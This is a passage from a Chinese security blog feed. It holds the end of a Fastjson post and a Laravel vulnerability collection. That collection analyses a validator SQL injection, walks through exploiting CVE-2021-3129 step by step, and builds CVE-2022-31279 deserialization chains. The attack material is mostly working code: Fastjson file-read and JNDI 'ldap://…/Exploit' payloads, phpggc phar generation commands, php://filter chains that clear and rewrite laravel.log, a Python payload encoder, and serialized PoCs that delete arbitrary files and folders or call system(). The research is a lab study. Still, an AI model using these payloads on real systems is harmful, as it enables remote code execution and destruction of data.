&lt;version&gt;2.1&lt;/version&gt;&lt;/dependency&gt;</code></pre><p>POC</p><pre><code class="json">&#123;    &quot;abc&quot;: &#123;        &quot;@type&quot;: &quot;java.lang.AutoCloseable&quot;,        &quot;@type&quot;: &quot;org.apache.commons.io.input.BOMInputStream&quot;,        &quot;delegate&quot;: &#123;            &quot;@type&quot;: &quot;org.apache.commons.io.input.ReaderInputStream&quot;,            &quot;reader&quot;: &#123;                &quot;@type&quot;: &quot;jdk.nashorn.api.scripting.URLReader&quot;,                &quot;url&quot;: &quot;file:///D:/1.txt&quot;            &#125;,            &quot;charsetName&quot;: &quot;UTF-8&quot;,            &quot;bufferSize&quot;: 1024        &#125;,        &quot;boms&quot;: [&#123;            &quot;charsetName&quot;: &quot;UTF-8&quot;,            &quot;bytes&quot;: [66]        &#125;]    &#125;,    &quot;address&quot;: &#123;        &quot;$ref&quot;: &quot;$.abc.BOM&quot;    &#125;&#125;</code></pre><h3 id="其他POC"><a href="#其他POC" class="headerlink" title="其他POC"></a>其他POC</h3><p>均需要开启AutoType，且会被JNDI注入利用所受的JDK版本限制</p><p>org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig类PoC：</p><pre><code class="json">&#123;&quot;@type&quot;:&quot;org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig&quot;,&quot;metricRegistry&quot;:&quot;ldap://localhost:1389/Exploit&quot;&#125;或&#123;&quot;@type&quot;:&quot;org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig&quot;,&quot;healthCheckRegistry&quot;:&quot;ldap://localhost:1389/Exploit&quot;&#125;</code></pre><p>com.caucho.config.types.ResourceRef类PoC：</p><pre><code class="json">&#123;&quot;@type&quot;:&quot;com.caucho.config.types.ResourceRef&quot;,&quot;lookupName&quot;: &quot;ldap://localhost:1389/Exploit&quot;, &quot;value&quot;: &#123;&quot;$ref&quot;:&quot;$.value&quot;&#125;&#125;</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Laravel漏洞合集</title>
      <link href="/2023/08/02/Laravel%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86/"/>
      <url>/2023/08/02/Laravel%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86/</url>
      
        <content type="html"><![CDATA[<h1 id="Laravel漏洞合集"><a href="#Laravel漏洞合集" class="headerlink" title="Laravel漏洞合集"></a>Laravel漏洞合集</h1><h2 id="SQL注入-ignore"><a href="#SQL注入-ignore" class="headerlink" title="SQL注入(ignore)"></a>SQL注入(ignore)</h2><p>漏洞描述：</p><p>该漏洞存在于Laravel的表单验证功能，漏洞函数为ignore()，漏洞文件位于&#x2F;vendor&#x2F;laravel&#x2F;ramework&#x2F;src&#x2F;Illuminate&#x2F;Validation&#x2F;Rules&#x2F;Unique.php。有时候开发者希望在进行字段唯一性验证时忽略指定字段以及字段值，通常会调用Rule类的ignore方法。该方法有两个参数，第一个参数为字段值，第二个参数为字段名，当字段名为空时，默认字段名为“id”。如果用户可以控制ignore()方法的参数值，就会产生SQL注入漏洞。漏洞影响版本&lt;&#x3D;5.8.5</p><p>查看官方修改：</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230717104547143.png" alt="image-20230717104547143"></p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230717111129726.png" alt="image-20230717111129726"></p><p>发现在<code>ignore</code>值获取的过程中添加了<code>addslashes()</code>过滤</p><p>测试环境搭建：</p><p>新建一个控制器：<code>\app\Http\Controllers\TestController.php</code></p><pre><code class="php">&lt;?phpnamespace App\Http\Controllers;use Illuminate\Http\Request;use Illuminate\Validation\Rule;use Illuminate\Support\Facades\Validator;use Illuminate\Support\Facades\DB;class TestController extends Controller&#123;    public function index(Request $request)    &#123;        $validator = Validator::make($request-&gt;input(), [            &#39;username&#39; =&gt; [                &#39;required&#39;,                Rule::unique(&quot;users&quot;)-&gt;ignore($request-&gt;input(&quot;id&quot;))            ],        ]);        dump($validator-&gt;fails());    &#125;&#125;</code></pre><p>在该index方法内部，首先创建了一个验证器实例$validator。验证器Validator::make()用于验证请求的输入数据是否符合指定的规则。</p><p>在这个例子中，Validator使用了make()方法来创建一个验证器实例，并将request-&gt;input()作为要验证的数据传递进去。验证器根据指定的规则对输入数据进行验证。在这里，验证规则是”username”字段是必需的（required），并且在数据库表”users”中是唯一的（unique）。使用了Rule::unique()方法来设置这个规则，并通过ignore()方法忽略了当前请求输入中的”id”字段的值。</p><p>最后，使用dump()函数输出$validator-&gt;fails()的结果。</p><p>在<code>routes/web.php</code>添加路由：</p><pre><code>Route::any(&quot;/&quot;,&quot;TestController@index&quot;);</code></pre><p>最后在<code>.env</code>配置好数据库连接信息</p><p>在5.7.0的版本中的对应代码：<code>/vendor/laravel/ramework/src/Illuminate/Validation/Rules/Unique.php</code></p><pre><code class="php">public function ignore($id, $idColumn = null)    &#123;        if ($id instanceof Model) &#123;            return $this-&gt;ignoreModel($id, $idColumn);        &#125;        $this-&gt;ignore = $id;        $this-&gt;idColumn = $idColumn ?? &#39;id&#39;;        return $this;    &#125;public function __toString()    &#123;        return rtrim(sprintf(&#39;unique:%s,%s,%s,%s,%s&#39;,            $this-&gt;table,            $this-&gt;column,            $this-&gt;ignore ? &#39;&quot;&#39;.$this-&gt;ignore.&#39;&quot;&#39; : &#39;NULL&#39;,            $this-&gt;idColumn,            $this-&gt;formatWheres()        ), &#39;,&#39;);    &#125;</code></pre><p>在这两个方法开始的地方下断点调试</p><pre><code>/username=admin&amp;id=2</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230718165536832.png" alt="image-20230718165536832"></p><p><code>$this-&gt;ignore</code>直接获取到请求传来的<code>$id</code>值</p><p>之后会走到这个类下的__toString方法，这里也只是对 <code>$this-&gt;ignore</code>是否为空的处理，然后构造出<code>unique:users,NULL,&quot;2&quot;,id</code></p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230718170055180.png" alt="image-20230718170055180"></p><p>然后回到构造函数：<code>$validator-&gt;fails()</code>跟进：</p><pre><code class="php">public function fails()    &#123;        return ! $this-&gt;passes();    &#125;</code></pre><p>继续跟进：passes()</p><p>这里存在一个二维数组rules的遍历，然后调用了validateAttribute，跟进<code>validateAttribute</code></p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230718171036378.png" alt="image-20230718171036378"></p><p>validateAttribute方法的最后，会根据rule的内容进行调用validate开头的方法，这里会调用到validateUnique方法</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230718171821430.png" alt="image-20230718171821430"></p><p>在<code>validateUnique</code>方法的最后，会调用一个getCount方法，这个方法是用来判断唯一性的，说明里面存在sql执行，跟进查看</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230718172746191.png" alt="image-20230718172746191"></p><p>在这个方法中，前面部分是构建sql语句的，再跟进<code>count()</code>,猜测这里是执行sql语句的地方</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230718173031435.png" alt="image-20230718173031435"></p><p>再这个方法里只有一行,继续往下跟进</p><pre><code>public function count($columns = &#39;*&#39;)    &#123;        return (int) $this-&gt;aggregate(__FUNCTION__, Arr::wrap($columns));    &#125;</code></pre><p>跟进到<code>compileSelect</code>,得到sql语句,其中<code>?</code>是占位符</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230718174033102.png" alt="image-20230718174033102"></p><p>得到sql语句后返回，返回到<code>select()</code></p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230718174350206.png" alt="image-20230718174350206"></p><p>在这个函数中<code>bindValues</code>方法对sql语句的占位符绑定了数据，然后执行查询，返回执行数据</p><p>注入：</p><p>注入通常是对键名 进行带入, 如果带入进键值的话, 没有任何效果, 这里关键的突破点就是 ignore函数中的 idColumn 变量, 以及 toString() 在处理 ignore中的处理方式</p><p>上面传入<code>username=admin&amp;id=1</code>时，得到的sql语句为</p><pre><code>select count(*) as aggregate from `users` where `username` = ? and `id` = ?</code></pre><p>当传入<code>username=admin&amp;id=1&quot;,&quot;aaa&quot;,&quot;</code>时:</p><pre><code>select count(*) as aggregate from `users` where `username` = ? and `aaa` &lt;&gt; ? and `` = ?</code></pre><p>在parse()函数解析id的值时，将<code>1&quot;,&quot;aaa&quot;,&quot;</code>分开了</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230718202447714.png" alt="image-20230718202447714"></p><p>然后覆盖了$idColumn</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230718203016018.png" alt="image-20230718203016018"></p><p>注入后出现报错</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230718203839207.png" alt="image-20230718203839207"></p><p>是注入了，但是我无法将其利用，太菜了</p><h2 id="CVE-2021-3129-debug-rce"><a href="#CVE-2021-3129-debug-rce" class="headerlink" title="CVE-2021-3129(debug rce)"></a>CVE-2021-3129(debug rce)</h2><p>影响版本：Laravel &lt;&#x3D; 8.4.2&amp;&amp;facade ignition 组件 &lt; &#x3D;2.5.1</p><p>简介：</p><p>当Laravel开启了Debug模式时，由于Laravel自带的Ignition 组件对file_get_contents()和file_put_contents()函数的不安全使用，攻击者可以通过发起恶意请求，构造恶意Log文件等方式触发Phar反序列化，最终造成远程代码执行。</p><p>查看更新，对比laravel的8.4.2和8.4.3版本，并没发现什么重要的修改</p><p>查看ignition的更新 ，对比2.5.1和2.5.2版本</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230714153223899.png" alt="image-20230714153223899"></p><p>在<code>src/Solutions/MakeViewVariableOptionalSolution.php</code>修改了两个函数，其中<code>makeOptional</code>函数添加了对**$parameters[‘viewFile’]**的安全过滤</p><p>修改前：</p><pre><code class="php">public function makeOptional(array $parameters = [])    &#123;        $originalContents = file_get_contents($parameters[&#39;viewFile&#39;]);        $newContents = str_replace(&#39;$&#39;.$parameters[&#39;variableName&#39;], &#39;$&#39;.$parameters[&#39;variableName&#39;].&quot; ?? &#39;&#39;&quot;, $originalContents);        $originalTokens = token_get_all(Blade::compileString($originalContents));        $newTokens = token_get_all(Blade::compileString($newContents));        $expectedTokens = $this-&gt;generateExpectedTokens($originalTokens, $parameters[&#39;variableName&#39;]);        if ($expectedTokens !== $newTokens) &#123;            return false;        &#125;</code></pre><p>漏洞就出现在函数的第一行<code>file_get_contents($parameters[&#39;viewFile&#39;])</code>  这个数组是由函数的参数获取,后面存在一个内容替换，根据<code>$</code>，可以猜测这个是一个变量名，将<code>$变量名</code>替换为<code>$变量名 ?? &#39;&#39;</code></p><p>查看这个函数被调用的地方，就在这个函数的上方，发现有两个</p><pre><code class="php">public function isRunnable(array $parameters = [])    &#123;        return $this-&gt;makeOptional($this-&gt;getRunParameters()) !== false;    &#125;    public function run(array $parameters = [])    &#123;        $output = $this-&gt;makeOptional($parameters);        if ($output !== false) &#123;            file_put_contents($parameters[&#39;viewFile&#39;], $output);        &#125;    &#125;</code></pre><p>先分析<code>isRunnable</code>这里的<code>makeOptional</code>的参数是<code>$this-&gt;getRunParameters()</code>的返回值，跟进发现,它直接获取这个类的属性值，属性的赋值在构造函数中</p><pre><code class="php">public function getRunParameters(): array    &#123;        return [            &#39;variableName&#39; =&gt; $this-&gt;variableName,            &#39;viewFile&#39; =&gt; $this-&gt;viewFile,        ];    &#125;public function __construct($variableName = null, $viewFile = null)    &#123;        $this-&gt;variableName = $variableName;        $this-&gt;viewFile = $viewFile;    &#125;</code></pre><p>再分析<code>run</code>方法</p><pre><code class="php">public function run(array $parameters = [])    &#123;        $output = $this-&gt;makeOptional($parameters);        if ($output !== false) &#123;            file_put_contents($parameters[&#39;viewFile&#39;], $output);        &#125;    &#125;</code></pre><p>这个第一句就调用了<code>makeOptional</code>,参数也是直接来自run的参数，而且后面还存在一个<code>file_put_contents</code></p><p>大概的意思是从makeOptional()获取文件的内容然后修改，然后在run()中调用<code>file_put_contents</code>将修改后的内容重新写回到该文件</p><p>下一步直接找调用<code>run()</code>的地方，直接找到<code>vendor/facade/ignition/src/Http/Controllers/ExecuteSolutionController.php</code></p><pre><code class="php">class ExecuteSolutionController&#123;    use ValidatesRequests;    public function __invoke(        ExecuteSolutionRequest $request,        SolutionProviderRepository $solutionProviderRepository    ) &#123;        $solution = $request-&gt;getRunnableSolution();        $solution-&gt;run($request-&gt;get(&#39;parameters&#39;, []));        return response(&#39;&#39;);    &#125;&#125;</code></pre><p>首先要在<code>getRunnableSolution()</code>方法获取类，再执行这个类的run方法</p><p>可以看到run的参数来自<code>$request-&gt;get(&#39;parameters&#39;, [])</code>,从字面意思来看，似乎是从一个请求参数中获取名为<code>parameters</code>的数组</p><p>所在的函数是<code>__invoke</code>是个魔术函数，当尝试以调用函数的方式调用一个对象时，__invoke() 方法会被自动调用。</p><p>翻找开发文档：<a href="https://laravelacademy.org/post/21973">https://laravelacademy.org/post/21973</a></p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230714163703599.png" alt="image-20230714163703599"></p><p>通过这个开发文档可以知道，这个<code>ExecuteSolutionController</code>是一个单一控制器，果断搜索这个类的名字</p><p>找到：<code>vendor/facade/ignition/src/IgnitionServiceProvider.php</code></p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230714164022360.png" alt="image-20230714164022360"></p><p>在这里基本可以知道数据包</p><pre><code>POST /.../execute-solution</code></pre><p>但是其中的<code>...</code>还未知</p><p>到这里思路就断了，回头查看，这个类的函数都在<code>facade/ignition</code>下，就是laravel的一个组件</p><p>这个组件的作用：（翻译后的）</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230714162243708.png" alt="image-20230714162243708"></p><p>搞个报错应该就能触发组件里的类和方法了，但是错误有很多种，组件里面有对不同错误进行处理的类，根据出现漏洞的类的类名<code>MakeViewVariableOptionalSolution.php</code> 可以知道这个错误和View相关，再根据上面提到的<strong>变量名替换</strong> ，可以知道当View内的文件引用一个未定义的模板</p><p>即可触发这个类的对应方法，前提是开启了debug</p><p>根据开发文档，在<code>resources/view/</code>里添加了一个模板，命名为hello.blade.php</p><pre><code class="php">&lt;html&gt;&lt;body&gt;&lt;h1&gt;hello, &#123;&#123; $name &#125;&#125;&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p>添加路由：<code>routes/web.php</code></p><pre><code class="php">Route::get(&#39;/hello&#39;, function () &#123;    return view(&#39;hello&#39;);&#125;);</code></pre><p>然后访问<code>http://127.0.0.1/hello</code>,出现报错，并且出现出现变量名替换</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230714175756477.png" alt="image-20230714175756477"></p><p>点击<code>Make variable optional</code>就你走到漏洞出现的地方,这里进行抓包：</p><pre><code class="yaml">POST /_ignition/execute-solution HTTP/1.1Host: 192.168.0.121Content-Length: 198Accept: application/jsonUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36Content-Type: application/jsonOrigin: http://192.168.0.121Referer: http://192.168.0.121/helloAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Cookie:  XDEBUG_SESSION=PHPSTORM; Connection: close&#123;&quot;solution&quot;:&quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;,&quot;parameters&quot;:&#123;&quot;variableName&quot;:&quot;name&quot;,&quot;viewFile&quot;:&quot;D:\\phpstudy_pro\\WWW\\laravel-8.4.2\\resources\\views\\hello.blade.php&quot;&#125;&#125;</code></pre><p>可以看到POST里面存在<code>parameters</code> 参数，并且<code>solution</code>也指向了<code>MakeViewVariableOptionalSolution</code>这个类</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230715141049157.png" alt="image-20230715141049157"></p><p>参数传递解决，下一步解决file_get_contents和file_put_contents的利用，这里的这两个函数的参数，只能控制第一个参数，就是文件名，这里可以利用伪协议</p><p>测试phar反序列化 ， 使用.&#x2F;phpggc生成一个phar.log    ,这里的依赖存在monolog,所以用这条链</p><pre><code>php -d&#39;phar.readonly=0&#39; ./phpggc monolog/rce1 system calc --phar phar -o phar.log</code></pre><p>修改数据表</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230716170214432.png" alt="image-20230716170214432"></p><p>发包：</p><p>在file_get_contents触发了反序列化</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230716170340480.png" alt="image-20230716170340480"></p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230716170532868.png" alt="image-20230716170532868"></p><p>这个有个大前提，这个phar文件必须在受害者服务器上，而且是已知路径，正常来说，如果不存在文件上传，服务器上面是不可能存在这个phar文件</p><p>这里利用file_put_contents 使用php伪协议php:&#x2F;&#x2F;filter&#x2F;write达到控制laravel.log内容的效果。首先要想利用laravel.log，先清空log内容。可能会想到一直base64 decode。直到都为不可见字符解码清空。但是这个做法会有问题。因为base64在解码的时候如果”&#x3D;”后面还有内容则会报错。大佬的做法是utf-8转utf-16 然后quoted-printable编码 然后utf-16转utf-8 完成上述操作后log中所有字符转为不可见字符，最后base64 decode即可。</p><pre><code>php://filter/write=convert.iconv.utf-8.utf-16be|convert.quoted-printable-encode|convert.iconv.utf-16be.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230716172359114.png" alt="image-20230716172359114"></p><p>修改前的laravel.log</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230716172431556.png" alt="image-20230716172431556"></p><p>发包后：</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230716172511858.png" alt="image-20230716172511858"></p><p>下一步就是将phar的内容写入log文件里</p><p>生成POC</p><pre><code>php -d &quot;phar.readonly=0&quot; ./phpggc Laravel/RCE5 &quot;phpinfo();&quot; --phar phar -o php://output | base64 -w 0 | python -c &quot;import sys;print(&#39;&#39;.join([&#39;=&#39; + hex(ord(i))[2:] + &#39;=00&#39; for i in sys.stdin.read()]).upper())&quot;</code></pre><p>因为win系统没有base64命令，所以写成下面的python脚本</p><pre><code class="python">import subprocessimport base64# 执行第一步命令并获取输出结果cmd1 = &#39;D:\\phpstudy_pro\\Extensions\\php\\php7.4.30nts\\php -d &quot;phar.readonly=0&quot; ./phpggc Laravel/RCE5 &quot;phpinfo();&quot; --phar phar -o phar.log&#39;p1 = subprocess.Popen(cmd1, shell=True, stdout=subprocess.PIPE)output1, _ = p1.communicate()# print(output1)# 读取日志文件内容with open(&#39;phar.log&#39;, &#39;rb&#39;) as f:    log_content = f.read()# 将日志内容进行Base64编码base64_output = base64.b64encode(log_content).decode()# print(base64_output)# 将Base64编码后的结果转换为大写十六进制形式，每个字符前添加&quot;=&quot;符号hex_output = &#39;&#39;.join([&#39;=&#39; + hex(ord(i))[2:] + &#39;=00&#39; for i in base64_output]).upper()print(hex_output)</code></pre><p>将生成的payload发送过去，然后报错，记录在log里面</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230718091831933.png" alt="image-20230718091831933"></p><p>然后输入下面的伪协议进行解密：</p><pre><code>php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log</code></pre><p>发现解密出错了：</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230718092049976.png" alt="image-20230718092049976"></p><p>查看日志发现是<code>convert.iconv.utf-16le.utf-8</code>这一步解密出错了，这个过滤器的报错很容易理解，它是把两个字符变成一个字符</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230718092240244.png" alt="image-20230718092240244"></p><p>因此如果不是偶数个字符的话，就会报错，说明经过<code>convert.quoted-printable-decode</code>之后，日志中的字符数正好是奇数个，因此会报错。这时候我们需要想办法改一下在进行iconv的时候日志中字符的数量</p><p>查看解密前的log会发现，log里面记录着两次完整的payload， 还有一次是部分payload 而且是前面的部分,大概长这样</p><pre><code>[时间] [报错信息字符串] viewFile的值 [报错信息字符串] viewFile的值 [报错信息字符串] ...[报错信息字符串] 部分viewFile的值 [报错信息字符串]...</code></pre><p>如果我们想改变log长度的奇偶性，必须在payload前面添加字符，因为在前面添加一个字符，相当于整个log添加了3个字符，这样就能改变奇偶性，如果在paylaod的后面加，相当于整个log添加了2个字符奇偶性不变</p><p>当我们在前面添加了一个字符之后，重新解密，发现convert.quoted-printable-decode出错了，查看解密前的结果</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230718095615248.png" alt="image-20230718095615248"></p><p>这里参考<a href="https://blog.csdn.net/qq_22146195/article/details/107500750%E4%BA%86%E8%A7%A3Quoted-printable">https://blog.csdn.net/qq_22146195/article/details/107500750了解Quoted-printable</a> 编码</p><p>发现，当我们不加上’A’的时候是这样的 <code>file_get_contents(&#39;=50=00=44=00=39...&#39;)</code>    刚好可以解密，当加了一个’A’之后会挤掉了最后的9，这样最后是<code>=3</code>了，printable不能正好匹配了。因此改进的办法就很简单了，需要加三个A这里就会变成这样<code>AAA=50=00=44=00</code>和一开始这种情况（这时候是奇数个）<code>=50=00=44=00=39</code>相比</p><p>进行convert.quoted-printable-decode过滤器处理之后，一开始是5个字符，现在是7个字符，相当于增加得是2个字符，奇偶性还是没变。同样的道理，即使再添加3个字符也是一样，解密后，奇偶性还是没变</p><p>接下来单纯得想办法在前面或者后面增加A应该都不太行，解决办法就是额外再请求一条AA，让一开始payload不加A的时候就是偶数个，而不是奇数个</p><p>即，清空log之后，发送一个payload为”AA”  的数据表，此时报错然后记录再log中，此时字符个数是奇数个（如果只发送一个A,结果是偶数个），此时再发送一个上面不加A的payload <code>=50=00=44=00=39...</code>,此时两个奇数个的数据表加起来就能经过<code>convert.iconv.utf-16le.utf-8</code>正常的处理了</p><p>处理后的结果：</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230718103632817.png" alt="image-20230718103632817"></p><p>可以看到有两处相同的base64编码，即使后面正常的解密出来，也得不到正常的phar文件，我们可以在payload前面或者后面添加字符，使得utf-16转成utf-8时总有一个payload能被转换出来。</p><p>添加字符后不能改变奇偶性，所以如果在后面添加，log永远是偶数，但是在我的环境中经过base64解密后，会报错，所以在考虑前面加，如果在前面加，就要添加字符的个数为3的倍数,这样才不会改变奇偶性,这里添加了3个A</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230718105846412.png" alt="image-20230718105846412"></p><p>base64解密前</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230718105152647.png" alt="image-20230718105152647"></p><p>解密后：</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230718105302708.png" alt="image-20230718105302708"></p><p>此时已经将phar文件写入了log里面，最后一步就是触发phar反序列化了</p><pre><code>phar://../storage/logs/laravel.log/test.txt</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230718105622874.png" alt="image-20230718105622874"></p><p>每个人的环境不同，payload构造不一样，网上的脚本不一定能用</p><h2 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h2><h3 id="5-4-x-CVE-2022-31279"><a href="#5-4-x-CVE-2022-31279" class="headerlink" title="5.4.x (CVE-2022-31279)"></a>5.4.x (CVE-2022-31279)</h3><p>这里使用的是5.4.30</p><p>环境搭建：</p><p>添加控制器：<code>Http/Controllers/POPController.php</code></p><pre><code class="php">&lt;?phpnamespace App\Http\Controllers;class POPController extends Controller&#123;    public function index()    &#123;        if(isset($_GET[&#39;c&#39;]))&#123;            $c = $_GET[&#39;c&#39;];            unserialize($c);        &#125;        else&#123;            phpinfo();        &#125;    &#125;&#125;</code></pre><p>添加路由<code>routes/web.php</code></p><pre><code class="php">Route::get(&quot;/&quot;,&quot;\App\Http\Controllers\POPController@index&quot;);</code></pre><p>反序列化第一步，找<code>__destruct()</code>,找到了23个结果</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230719112207798.png" alt="image-20230719112207798"></p><p>简单看了一遍所有的结果，能用的不多，而且还找到了个简单的任意文件删除</p><p><code>\vendor\swiftmailer\swiftmailer\lib\classes\Swift\ByteStream\TemporaryFileByteStream.php</code></p><pre><code class="php">private $_path;public function __destruct()    &#123;        if (file_exists($this-&gt;getPath())) &#123;            @unlink($this-&gt;getPath());        &#125;    &#125;public function getPath()    &#123;        return $this-&gt;_path;    &#125;</code></pre><p>这里的<code>__destruct</code>调用了<code>getPath()</code>   而这个方法里面直接返回<code>_path</code>属性,这个属性可控，修改为要删除的文件路径就能删除任意文件了</p><p>POC:</p><p>假设存在一个名为1.txt的文件在public目录下</p><pre><code class="php">&lt;?phpabstract class Swift_ByteStream_AbstractFilterableInputStream&#123;&#125;class Swift_ByteStream_FileByteStream extends Swift_ByteStream_AbstractFilterableInputStream&#123;    private $_path;    public function __construct()    &#123;        $this-&gt;_path=&#39;1.txt&#39;;//文件名    &#125;&#125;class Swift_ByteStream_TemporaryFileByteStream extends Swift_ByteStream_FileByteStream&#123;&#125;$a=new Swift_ByteStream_TemporaryFileByteStream();echo urlencode(serialize($a));</code></pre><p>另外一个是删除任意文件夹</p><pre><code class="php">//vendor/swiftmailer/swiftmailer/lib/classes/Swift/KeyCache/DiskKeyCache.phppublic function __destruct()    &#123;        foreach ($this-&gt;_keys as $nsKey =&gt; $null) &#123;            $this-&gt;clearAll($nsKey);        &#125;   &#125;</code></pre><p>这里的<code>$this-&gt;_keys</code>可以控制，说明<code>$nsKey</code>可控，然后调用<code>$this-&gt;clearAll</code></p><pre><code class="php">public function clearAll($nsKey)    &#123;        if (array_key_exists($nsKey, $this-&gt;_keys)) &#123;            foreach ($this-&gt;_keys[$nsKey] as $itemKey =&gt; $null) &#123;                $this-&gt;clearKey($nsKey, $itemKey);            &#125;            if (is_dir($this-&gt;_path.&#39;/&#39;.$nsKey)) &#123;                rmdir($this-&gt;_path.&#39;/&#39;.$nsKey);            &#125;            unset($this-&gt;_keys[$nsKey]);        &#125;    &#125;</code></pre><p>可以看到<strong>rmdir</strong>函数而且<code>$this-&gt;_path</code>可控，并且<code>$nsKey</code>可控，所以这里可以删除任意文件夹</p><p>POC2:</p><p>假设存在一个名为aaa的文件夹在public目录下</p><pre><code class="php">// 删除当前目录下名为aaa的文件夹&lt;?phpclass Swift_KeyCache_DiskKeyCache&#123;    private $_path;    private $_keys = array();    public function __construct()    &#123;        $this-&gt;_path=&#39;.&#39;;//当前目录        $this-&gt;_keys=array(&#39;aaa&#39;=&gt;array(&#39;1&#39;=&gt;&#39;2&#39;)); //aaa为文件夹名    &#125;&#125;$a = new Swift_KeyCache_DiskKeyCache();echo urlencode(serialize($a));</code></pre><p>下面回到开始的 <code>__destruct()</code></p><p>除了上面两个，还注意到这个：</p><p><code>vendor/laravel/framework/src/Illuminate/Broadcasting/PendingBroadcast.php</code></p><pre><code class="php">public function __destruct()    &#123;        $this-&gt;events-&gt;dispatch($this-&gt;event);    &#125;</code></pre><p>这里可以触发<code>__call</code>,也可以调用任意类的<code>dispatch()</code>,如果是调用<code>dispatch</code>方法，可有控制输入的参数<code>$this-&gt;event</code></p><p>先走__call这个方向看看，全局查找 <code>__call</code> ,找到很多</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230719144322636.png" alt="image-20230719144322636"></p><p>这里找到</p><p><code>vendor/fzaninotto/faker/src/Faker/Generator.php</code></p><pre><code class="php">public function __call($method, $attributes)    &#123;        return $this-&gt;format($method, $attributes);    &#125;</code></pre><p>这里的$method为触发__call调用的方法名<code>dispatch</code>, 而<code>$attributes</code>为dispatch的参数，即<code>$this-&gt;event</code>,可控</p><p>跟进<code>format</code></p><pre><code class="php">public function format($formatter, $arguments = array())    &#123;        return call_user_func_array($this-&gt;getFormatter($formatter), $arguments);    &#125;</code></pre><p>这里调用了<code>call_user_func_array</code> ，再跟进<code>getFormatter</code></p><pre><code class="php">public function getFormatter($formatter)    &#123;        if (isset($this-&gt;formatters[$formatter])) &#123;            return $this-&gt;formatters[$formatter];        &#125;        foreach ($this-&gt;providers as $provider) &#123;            if (method_exists($provider, $formatter)) &#123;                $this-&gt;formatters[$formatter] = array($provider, $formatter);                return $this-&gt;formatters[$formatter];            &#125;        &#125;        throw new \InvalidArgumentException(sprintf(&#39;Unknown formatter &quot;%s&quot;&#39;, $formatter));    &#125;</code></pre><p>注意第一个if ,这个<code>$this-&gt;formatters</code>可控，如果构造<code>$this-&gt;formatters=[&#39;dispatch&#39;=&gt;&#39;system&#39;]</code>,就能返回函数名system 利用call_user_func_array调用system函数</p><p>构造POC尝试</p><pre><code class="php">&lt;?phpnamespace Illuminate\Broadcasting;use Faker\Generator;class PendingBroadcast&#123;    protected $events;    protected $event;    public function __construct()    &#123;        $this-&gt;event = &#39;calc&#39;;        $this-&gt;events = new Generator();    &#125;&#125;namespace Faker;class Generator&#123;    protected $formatters = array();    public function __construct()    &#123;        $this-&gt;formatters=[&#39;dispatch&#39;=&gt;&#39;system&#39;];    &#125;&#125;use Illuminate\Broadcasting\PendingBroadcast;$a = new PendingBroadcast();echo urlencode(serialize($a));</code></pre><p>经过调试发现<code>$this-&gt;formatters</code>赋值不上，原因是这个类存在一个__wakeup将$this-&gt;formatters 置空了</p><pre><code class="php">public function __wakeup()&#123;   $this-&gt;formatters = [];&#125;</code></pre><p>这个可以绕过，只要序列化的中的成员数大于实际成员数，即可绕过，但是有php版本限制，PHP5&lt;5.6.25，PHP7 &lt; 7.0.10</p><p>而安装laravel的php版本需要php&gt;&#x3D;5.64 ， 如果修改了成员数，是可以绕过__wakeup,但是会造成<code>$this-&gt;event = &#39;calc&#39;;</code>赋不上值</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230719162724629.png" alt="image-20230719162724629"></p><p>这条链子就这样被掐断了，尝试寻找其他绕过的方法</p><p>参考了<a 